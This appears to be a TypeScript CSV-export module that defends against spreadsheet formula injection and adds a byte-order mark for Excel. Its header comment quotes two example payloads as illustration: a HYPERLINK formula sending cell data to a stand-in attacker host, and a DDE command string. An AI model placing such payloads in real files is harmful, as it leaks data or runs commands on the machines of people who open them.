/* ============================================================================
 * CSV EXPORT — FR-091
 * ----------------------------------------------------------------------------
 * ── THE FORMULA-INJECTION GUARD IS THE REASON THIS IS NOT THREE LINES ────────
 * A cell beginning with `=`, `+`, `-` or `@` is executed as a formula when the
 * file is opened in Excel, Sheets or LibreOffice. A task titled
 *
 *     =HYPERLINK("https://evil.example/"&A1,"Click for the brief")
 *
 * becomes a live link built from a neighbouring cell the moment somebody opens
 * the export. Worse forms exist: `=cmd|'/c calc'!A1` still launches processes
 * in older Excel with DDE enabled.
 *
 * Nothing about this is exotic — it is the standard way a spreadsheet reads a
 * text file, and the data here is typed by people. The guard is a leading
 * apostrophe, which every spreadsheet reads as "this is text" and hides.
 *
 * ── AND A BOM, WHICH LOOKS LIKE SUPERSTITION AND IS NOT ──────────────────────
 * Excel on Windows reads a CSV as the system codepage unless the file opens
 * with a UTF-8 byte-order mark. Without it, every name with an accent in it —
 * every `–` in a title — arrives mangled, and the person's first thought is
 * that the CRM stored it wrong.
 *
 * ⚠️ **The BOM this function adds does not reach the browser on its own.**
 * Discovered 2026-08-12 by reading the bytes of a downloaded file: a leading
 * U+FEFF is stripped when a server action serialises its result, so the string
 * arriving in the browser begins at the first column heading. Every export had
 * silently been shipping without it.
 *
 * It is kept here — this function's output is correct, and anything writing the
 * file server-side gets it right — but the browser download path adds the BOM
 * again **as bytes**, in `lib/download.ts`, which is the only place nothing can
 * strip it. `downloadCsv` will not double it up.
 * ========================================================================= */

const DANGEROUS_PREFIX = /^[=+\-@\t\r]/;

/**
 * One cell.
 *
 * Order matters: neutralise the formula first, then quote. Quoting first would
 * put the apostrophe inside the quotes on the wrong side of the escaping.
 */
export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return '';

  let text = String(value);

  /* Newlines inside a quoted field are legal CSV and are handled correctly by
     every reader — but they turn one row into several in anything doing a naive
     line split, including `tail`, `grep` and most log viewers. Collapsed to a
     space, because a task description spanning eight rows of a spreadsheet is
     not what anybody wanted from an export either. */
  text = text.replace(/\r\n|\r|\n/g, ' ').trim();

  if (DANGEROUS_PREFIX.test(text)) text = `'${text}`;

  /* RFC 4180: quote if it contains a comma, a quote or whitespace at an edge;
     double any embedded quote. */
  if (/[",]/.test(text) || text !== text.trim() || text.includes(';')) {
    return `"${text.replace(/"/g, '""')}"`;
  }
  return text;
}

export function csvRow(values: readonly unknown[]): string {
  return values.map(csvCell).join(',');
}

/**
 * A complete file, ready to send.
 *
 * CRLF line endings, per RFC 4180 — Excel is the main consumer and it is the
 * pickiest about them.
 */
export function toCsv(
  headers: readonly string[],
  rows: readonly (readonly unknown[])[],
): string {
  /* Written as an escape rather than pasted in. A literal BOM is an invisible
     character at the start of a string — it survives nothing, and when one goes
     missing there is nothing on screen to show it. */
  const BOM = '\ufeff';
  return BOM + [csvRow(headers), ...rows.map(csvRow)].join('\r\n') + '\r\n';
}

/** `cni-tasks-2026-08-07.csv`. Dated, because exports accumulate in Downloads. */
export function exportFileName(prefix: string, isoDate: string): string {
  const safe = prefix
    .replace(/[^a-z0-9-]+/gi, '-')
    /* Trailing separators matter: 'Tasks "final"' becomes 'tasks-final-' and
       the date then makes 'tasks-final--2026-08-07', which looks like a bug in
       the export rather than a quirk of a title. */
    .replace(/^-+|-+$/g, '')
    .replace(/-{2,}/g, '-')
    .toLowerCase();

  return `${safe || 'export'}-${isoDate.slice(0, 10)}.csv`;
}
